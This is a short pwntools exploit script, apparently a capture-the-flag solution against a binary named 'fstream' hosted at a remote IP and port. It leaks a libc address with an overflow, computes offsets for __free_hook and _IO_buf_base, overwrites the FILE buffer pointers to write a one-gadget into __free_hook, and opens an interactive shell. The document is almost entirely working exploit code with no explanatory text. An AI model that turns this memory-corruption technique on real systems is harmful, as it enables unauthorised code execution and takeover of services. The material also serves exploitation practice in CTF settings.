from pwn import *
import sys, time

#context.binary = "./pwn_medium"
#binary = ELF("./pwn_medium")

prog = log.progress("Exploit stage ")

if len(sys.argv) == 1:
    p = process(["./fstream"])

else:
    p = remote("178.62.40.102", "6002")

p.recvuntil("> ")
p.sendline("11010110")
p.recvuntil("> ")
p.sendline("A" * 0x97)
p.recvuntil("A" * 0x97)
p.recv(1)
leak = u64(p.recv(6).ljust(8, "\x00"))
libc_base = leak - 240 - 0x20740
free_hook = libc_base + 0x3c67a8
_IO_buf_base = libc_base + 0x3c4918
magic = libc_base + 0x4526a
log.info("leak : " + hex(leak))
log.info("libc_base : " + hex(libc_base))
log.info("__free_hook : " + hex(free_hook))
log.info("_IO_buf_base : " + hex(_IO_buf_base))

p.sendlineafter("> ", "1" * 8)
p.sendlineafter("> ", "10110101")

p.sendlineafter("> ", str(_IO_buf_base + 1))
p.sendline("1".ljust(0x18, "\x00") + p64(free_hook) + p64(free_hook + 0x40) + p64(0) * 6)
for i in xrange(0x65):
    p.sendline("")
p.sendline(p64(magic))

p.interactive()
